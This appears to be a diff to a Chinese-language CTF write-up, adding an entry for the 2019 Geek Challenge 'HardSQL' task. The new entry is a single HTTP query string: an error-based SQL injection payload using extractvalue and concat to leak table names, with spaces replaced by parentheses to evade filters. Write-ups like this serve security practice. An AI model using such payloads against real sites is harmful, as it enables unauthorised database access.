@@ -347,3 +347,7 @@ echo serialize($flag);
 （好像除了index.php之外都并不是直接给的，但是我们也只需要利用php伪协议去读取就好了）
 
 # 极客大挑战 2019【HardSQL】
+
+```http
+?username=1&password=2'or(extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())))))%23
+```
